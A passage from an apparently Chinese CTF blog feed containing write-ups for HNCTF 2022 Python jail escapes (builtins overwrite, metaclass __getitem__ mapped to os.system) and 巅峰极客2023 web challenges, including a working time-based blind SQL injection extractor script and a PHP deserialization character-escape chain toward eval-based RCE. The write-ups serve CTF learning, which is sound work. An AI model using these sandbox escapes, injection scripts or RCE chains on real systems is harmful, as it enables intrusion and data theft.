class="string">&#x27;os.system&#x27;</span>]</span><br></pre></td></tr></table></figure><br>payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(&quot;globals()[&#x27;__builtins__&#x27;][&#x27;set&#x27;]=lambda x: [&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;,&#x27;exec&#x27;, &#x27;compile&#x27;, &#x27;os.system&#x27;]\nimport os\nos.system(&#x27;ls&#x27;)&quot;)</span><br><span class="line"></span><br><span class="line">exec(&quot;globals()[&#x27;__builtins__&#x27;][&#x27;set&#x27;]=lambda x: [&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;,&#x27;exec&#x27;, &#x27;compile&#x27;, &#x27;os.system&#x27;]\nimport os\nos.system(&#x27;cat flag&#x27;)&quot;)</span><br></pre></td></tr></table></figure></p>
<h3 id="HNCTF-2022-WEEK3-s-Fe-safeeval-JAIL"><a href="#HNCTF-2022-WEEK3-s-Fe-safeeval-JAIL" class="headerlink" title="[HNCTF 2022 WEEK3]s@Fe safeeval(JAIL)"></a>[HNCTF 2022 WEEK3]s@Fe safeeval(JAIL)</h3><p>考点: ==lambda调用函数==<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Terminal features will <span class="keyword">not</span> be available.  Consider setting TERM variable to your current terminal name (<span class="keyword">or</span> xterm).</span><br><span class="line"></span><br><span class="line">              ______                __                     _</span><br><span class="line">        ____ |  ____|              / _|                   | |</span><br><span class="line">  ___  / __ \| |__ ___   ___  __ _| |_ ___  _____   ____ _| |</span><br><span class="line"> / __|/ / _` |  __/ _ \ / __|/ _` |  _/ _ \/ _ \ \ / / _` | |</span><br><span class="line"> \__ \ | (_| | | |  __/ \__ \ (_| | ||  __/  __/\ V / (_| | |</span><br><span class="line"> |___/\ \__,_|_|  \___| |___/\__,_|_| \___|\___| \_/ \__,_|_|</span><br><span class="line">       \____/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Turing s@Fe mode: on</span><br><span class="line">Black <span class="type">List</span>:</span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;POP_TOP&#x27;</span>,<span class="string">&#x27;ROT_TWO&#x27;</span>,<span class="string">&#x27;ROT_THREE&#x27;</span>,<span class="string">&#x27;ROT_FOUR&#x27;</span>,<span class="string">&#x27;DUP_TOP&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;BUILD_LIST&#x27;</span>,<span class="string">&#x27;BUILD_MAP&#x27;</span>,<span class="string">&#x27;BUILD_TUPLE&#x27;</span>,<span class="string">&#x27;BUILD_SET&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;BUILD_CONST_KEY_MAP&#x27;</span>, <span class="string">&#x27;BUILD_STRING&#x27;</span>,<span class="string">&#x27;LOAD_CONST&#x27;</span>,<span class="string">&#x27;RETURN_VALUE&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;STORE_SUBSCR&#x27;</span>, <span class="string">&#x27;STORE_MAP&#x27;</span>,<span class="string">&#x27;LIST_TO_TUPLE&#x27;</span>, <span class="string">&#x27;LIST_EXTEND&#x27;</span>, <span class="string">&#x27;SET_UPDATE&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;DICT_UPDATE&#x27;</span>, <span class="string">&#x27;DICT_MERGE&#x27;</span>,<span class="string">&#x27;UNARY_POSITIVE&#x27;</span>,<span class="string">&#x27;UNARY_NEGATIVE&#x27;</span>,<span class="string">&#x27;UNARY_NOT&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;UNARY_INVERT&#x27;</span>,<span class="string">&#x27;BINARY_POWER&#x27;</span>,<span class="string">&#x27;BINARY_MULTIPLY&#x27;</span>,<span class="string">&#x27;BINARY_DIVIDE&#x27;</span>,<span class="string">&#x27;BINARY_FLOOR_DIVIDE&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;BINARY_TRUE_DIVIDE&#x27;</span>,<span class="string">&#x27;BINARY_MODULO&#x27;</span>,<span class="string">&#x27;BINARY_ADD&#x27;</span>,<span class="string">&#x27;BINARY_SUBTRACT&#x27;</span>,<span class="string">&#x27;BINARY_LSHIFT&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;BINARY_RSHIFT&#x27;</span>,<span class="string">&#x27;BINARY_AND&#x27;</span>,<span class="string">&#x27;BINARY_XOR&#x27;</span>,<span class="string">&#x27;BINARY_OR&#x27;</span>,<span class="string">&#x27;MAKE_FUNCTION&#x27;</span>, <span class="string">&#x27;CALL_FUNCTION&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">some code:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">import</span> traceback</span><br><span class="line">    <span class="keyword">import</span> pwnlib.util.safeeval <span class="keyword">as</span> safeeval</span><br><span class="line">    input_data = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(expr(input_data))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">expr</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="keyword">if</span> TURING_PROTECT_SAFE:</span><br><span class="line">            m = safeeval.test_expr(n, blocklist_codes)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">eval</span>(m)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> safeeval.expr(n)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(lambda:os.system(&#x27;cat flag&#x27;))()</span><br></pre></td></tr></table></figure>
<h3 id="HNCTF-2022-WEEK3-calc-jail-beginner-level7-JAIL"><a href="#HNCTF-2022-WEEK3-calc-jail-beginner-level7-JAIL" class="headerlink" title="[HNCTF 2022 WEEK3]calc_jail_beginner_level7(JAIL)"></a>[HNCTF 2022 WEEK3]calc_jail_beginner_level7(JAIL)</h3><p>考点: ==AST生成树的类型绕过(metaclass方法绕过Call类型)==<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Black List AST:                  &#x27;Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef,Sub,Mult,Div,Del&#x27;</span><br></pre></td></tr></table></figure><br>这里的AST禁用是把python代码转为AST语法树查看类型是否等于以上类型,这里直接给出源码算了<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    _       _ _   _                _                         _                _ ______</span></span><br><span class="line"><span class="string">   (_)     (_) | | |              (_)                       | |              | |____  |</span></span><br><span class="line"><span class="string">    _  __ _ _| | | |__   ___  __ _ _ _ __  _ __   ___ _ __  | | _____   _____| |   / /</span></span><br><span class="line"><span class="string">   | |/ _` | | | | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__| | |/ _ \ \ / / _ \ |  / /</span></span><br><span class="line"><span class="string">   | | (_| | | | | |_) |  __/ (_| | | | | | | | |  __/ |    | |  __/\ V /  __/ | / /</span></span><br><span class="line"><span class="string">   | |\__,_|_|_| |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|    |_|\___| \_/ \___|_|/_/</span></span><br><span class="line"><span class="string">  _/ |                        __/ |</span></span><br><span class="line"><span class="string"> |__/                        |___/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_ast_secure</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):<span class="comment">#遍历AST`m`中的所有节点</span></span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">type</span>(x):<span class="comment">#匹配这些节点的类型与下面的类型做比较查看是否相等</span></span><br><span class="line">      <span class="keyword">case</span> (ast.Import|ast.ImportFrom|ast.Call|ast.Expr|ast.Add|ast.Lambda|ast.FunctionDef|ast.AsyncFunctionDef|ast.Sub|ast.Mult|ast.Div|ast.Del):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned statement <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exexute_code</span>(<span class="params">my_source_code</span>):</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Pls input your code: (last line must contain only --HNCTF)&quot;</span>)</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    line = sys.stdin.readline()</span><br><span class="line">    <span class="keyword">if</span> line.startswith(<span class="string">&quot;--HNCTF&quot;</span>):<span class="comment">#以--HNCTF开头的代码作为结束标识</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    my_source_code += line</span><br><span class="line"></span><br><span class="line">  tree_check = <span class="built_in">compile</span>(my_source_code, <span class="string">&quot;input_code.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">  <span class="comment">#将 my_source_code 中的 Python 代码编译成抽象语法树（AST），并将该 AST 对象赋值给 tree_check 变量</span></span><br><span class="line">  <span class="keyword">if</span> verify_ast_secure(tree_check):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;check is passed!now the result is:&quot;</span>)</span><br><span class="line">    compiled_code = <span class="built_in">compile</span>(my_source_code, <span class="string">&quot;input_code.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(compiled_code)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Press any key to continue&quot;</span>)</span><br><span class="line">  sys.stdin.readline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  os.system(<span class="string">&quot;clear&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(WELCOME)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;=================================================================================================&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;==           Welcome to the calc jail beginner level7,It&#x27;s AST challenge                       ==&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;==           Menu list:                                                                        ==&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;==             [G]et the blacklist AST                                                         ==&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;==             [E]xecute the python code                                                       ==&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;==             [Q]uit jail challenge                                                           ==&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;=================================================================================================&quot;</span>)</span><br><span class="line">  ans = (sys.stdin.readline().strip()).lower()</span><br><span class="line">  <span class="keyword">if</span> ans == <span class="string">&#x27;g&#x27;</span>:</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;=================================================================================================&quot;</span>)</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;==        Black List AST:                                                                      ==&quot;</span>)</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;==                       &#x27;Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef  ==&quot;</span>)</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;==                        Sub,Mult,Div,Del&#x27;                                                    ==&quot;</span>)</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;=================================================================================================&quot;</span>)</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;Press any key to continue&quot;</span>)</span><br><span class="line">     sys.stdin.readline()</span><br><span class="line">  <span class="keyword">elif</span> ans == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">    my_source_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    exexute_code(my_source_code)</span><br><span class="line">  <span class="keyword">elif</span> ans == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Bye&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Unknown options!&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>看大佬博客发现需要学一个魔术方法<code>metaclass</code>,链接: <a href="https://zhuanlan.zhihu.com/p/149126959">https://zhuanlan.zhihu.com/p/149126959</a><br>这个方法可以给原生类添加新的属性<br>eg<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListMeta</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, name, bases, attrs</span>):</span><br><span class="line">        <span class="comment"># 在类属性当中添加了add函数</span></span><br><span class="line">        <span class="comment"># 通过匿名函数映射到append函数上</span></span><br><span class="line">        attrs[<span class="string">&#x27;add&#x27;</span>] = <span class="keyword">lambda</span> self, value: self.append(value)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__new__(cls, name, bases, attrs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyList</span>(<span class="built_in">list</span>, metaclass=ListMeta):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">lt=MyList()</span><br><span class="line"><span class="built_in">print</span>(lt)</span><br><span class="line">lt.add(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(lt)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[]</span></span><br><span class="line"><span class="comment">#[3]</span></span><br></pre></td></tr></table></figure></p>
<p>现在可以把一个类的一个属性改为<code>os.system函数</code>,调用的时候可以直接执行,这里需要用到<code>__getitem</code>,本来是获取列表或字典的值的一个属性<br>eg.<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">jmx</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">jmx.__getitem__=os.system</span><br><span class="line">jmx()[<span class="string">&#x27;whoami&#x27;</span>]</span><br></pre></td></tr></table></figure></p>
<p>而此时ast生成树有黑名单的<code>Expr</code>和<code>Call</code><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line">src=<span class="string">&quot;&quot;&quot;import os</span></span><br><span class="line"><span class="string">class jmx():</span></span><br><span class="line"><span class="string">    pass</span></span><br><span class="line"><span class="string">jmx.__getitem__=os.system</span></span><br><span class="line"><span class="string">jmx()[&#x27;whoami&#x27;]&quot;&quot;&quot;</span></span><br><span class="line">ast_code=ast.parse(src,<span class="string">&quot;test4.py&quot;</span>,mode=<span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ast.dump(ast_code))</span><br></pre></td></tr></table></figure></p>
<ul>
<li>Expr可以通过赋值绕过</li>
<li>Call可以用metaclass给类添加属性绕过,这样不是类生成的对象有这个属性,这样我们就不用调用实例化类的Call<br>payload:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">class jmx(type):</span><br><span class="line">    __getitem__=os.system</span><br><span class="line">class evil(metaclass=jmx):</span><br><span class="line">    pass</span><br><span class="line">poc=evil[&#x27;sh&#x27;]</span><br><span class="line">--HNCTF</span><br></pre></td></tr></table></figure>
这里发现Import也ban了.而题目环境是有os的,所以我们把<code>mport os</code>删了就行<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class jmx(type):</span><br><span class="line">    __getitem__=os.system</span><br><span class="line">class evil(metaclass=jmx):</span><br><span class="line">    pass</span><br><span class="line">poc=evil[&#x27;sh&#x27;]</span><br><span class="line">--HNCTF</span><br></pre></td></tr></table></figure>
<img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231224162822.png" alt="image.png"></li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.woodwhale.top/archives/hnctfj-ail-all-in-one#week2lak3-lak3-lak3jail">https://www.woodwhale.top/archives/hnctfj-ail-all-in-one#week2lak3-lak3-lak3jail</a></p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>巅峰极客2023web writeup1</title>
    <url>/2024/02/06/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023/</url>
    <content><![CDATA[<h3 id="hellosql"><a href="#hellosql" class="headerlink" title="hellosql"></a>hellosql</h3><p>经过简单fuzz一下发现过滤了<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* sleep union benchmark count if </span><br></pre></td></tr></table></figure><br>为什么偏偏就过滤和时间盲注有点的关键词呢，我感觉是考时间盲注的bypass，禁用了sleep，benchmark和<code>count(*)</code>,想到了get_lock,而这题就是考的笛卡尔积,碰到知识盲区了没做出来,赛后学了一下笛卡尔积时间盲注,查漏补缺了一下时间盲注的方法,都写这在这篇文章了<a href="https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注的方法</a></p>
<p>if过滤用case…when…then…end代替,<code>count(*)</code>可以用其他的聚合函数(avg,sum,min,max)绕过,这里用max</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">url = <span class="string">&#x27;http://web-83bfbb55f8.challenge.xctf.org.cn/index.php&#x27;</span>  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  </span><br><span class="line">    high = <span class="number">127</span>  </span><br><span class="line">    low = <span class="number">32</span>  </span><br><span class="line">    mid = (low + high) // <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">while</span> high &gt; low:  </span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or case when ascii(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;&#125;,1))&gt;&#123;&#125; then (select MAX(A.TABLE_NAME) from information_schema.columns A, information_schema.columns B) END#&quot;.format(i, mid)  #表名为Flllag  </span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or case when ascii(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;Flllag&#x27;),&#123;&#125;,1))&gt;&#123;&#125; then (select MAX(A.TABLE_NAME) from information_schema.columns A, information_schema.columns B) END#&quot;.format(i, mid) #字段只有一个是Flagg  </span></span><br><span class="line">        payload = <span class="string">&quot;&#x27; or case when ascii(SUBSTR((select(group_concat(Flagg))from(Flllag)),&#123;&#125;,1))&gt;&#123;&#125; then (select MAX(A.TABLE_NAME) from information_schema.columns A, information_schema.columns B) END#&quot;</span>.<span class="built_in">format</span>(i, mid) <span class="comment">#查数据  </span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: payload, &#125;  </span><br><span class="line">        last = time.time()  </span><br><span class="line">        response = requests.get(url, params=data)  </span><br><span class="line">        now = time.time()  </span><br><span class="line">        <span class="keyword">if</span> now - last &gt;= <span class="number">0.5</span>:  </span><br><span class="line">            low = mid + <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            high = mid  </span><br><span class="line">        mid = (low + high) // <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">if</span> mid==<span class="number">32</span> <span class="keyword">or</span> mid==<span class="number">127</span>:  </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">    <span class="built_in">print</span>(i)  </span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag)  </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/07/22/dYP15kAya8tuWcB.png" alt="屏幕截图 2023-07-21 231932.png"></p>
<h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h3><p><code>www.zip</code>下载源码,发现这几个文件:<br>function.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;bbbbbb&#x27;</span>, <span class="variable">$data</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bbbbbb&#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="variable">$data</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>index.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;  </span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;  </span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;login.html&quot;</span>;  </span><br><span class="line"><span class="title function_ invoke__">session_start</span>();  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>])) &#123;  </span><br><span class="line"><span class="variable">$root</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>];  </span><br><span class="line"><span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];  </span><br><span class="line"><span class="variable">$login</span> = <span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>(<span class="variable">$root</span>, <span class="variable">$pwd</span>);  </span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="title function_ invoke__">b</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$login</span>));  </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=`./login.php`;&lt;/script&gt;&#x27;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>login.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">session_start</span>();  </span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;  </span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(`Login First!`);location.href=`./index.php`;&lt;/script&gt;&#x27;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$login</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">a</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]));  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$login</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>my.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;  </span><br><span class="line"><span class="keyword">private</span> <span class="variable">$x</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x) &#123;  </span><br><span class="line"><span class="variable">$preg_match</span> = <span class="string">&#x27;return preg_match(&quot;/[A-Za-z0-9]+/i&quot;, $this-&gt;x);&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="variable">$preg_match</span>)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$preg_match</span>;  </span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;save_waf&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;x);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;  </span><br><span class="line"><span class="keyword">private</span> <span class="variable">$root</span>;  </span><br><span class="line"><span class="keyword">private</span> <span class="variable">$pwd</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$root</span>, <span class="variable">$pwd</span></span>) </span>&#123;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;root = <span class="variable">$root</span>;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;pwd = <span class="variable">$pwd</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;root);  </span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;pwd);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;root) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;pwd)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Hello, <span class="subst">$this</span>-&gt;root&lt;/h1&gt;&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span> &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>反序列化字符逃逸加无字母数字rce,这里需要知道一个知识:反序列化一个字符串为对象时如果这个字符串里包含一个对象那它也会反序列化,还有一个就是这个字符逃逸只需要看a函数就行</p>
<p>先随便测试一下:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;push_it&quot;:2:&#123;s:13:&quot;push_itroot&quot;;s:4:&quot;test&quot;;s:12:&quot;push_itpwd&quot;;s:4:&quot;test&quot;;&#125;</span><br></pre></td></tr></table></figure><br>==注意:==这里由于private属性有%00,没标出来知道就好<br>目标:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:3:&quot;pwd&quot;;O:7:&quot;pull_it&quot;:1:&#123;s:1:&quot;x&quot;;s:21:&quot;?&gt;&lt;?=`/???/??? /**`;?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><br>把它带入pwd变量:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;push_it&quot;:2:&#123;s:13:&quot;push_itroot&quot;;s:4:&quot;test&quot;;s:12:&quot;push_itpwd&quot;;s:4:&quot;&quot;;s:3:&quot;pwd&quot;;O:7:&quot;pull_it&quot;:1:&#123;s:1:&quot;x&quot;;s:21:&quot;?&gt;&lt;?=`/???/??? /**`;?&gt;&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><br>此时需要逃逸的字符是:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:12:&quot;push_itpwd&quot;;s:4:&quot;</span><br></pre></td></tr></table></figure><br>共27个字符,但要按28算,因为经过测试s后面这个4会变成两位数(注意有%00)<br>bbbbbb-&gt;aaaa少了2个,14个bbbbbb就行<br>payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 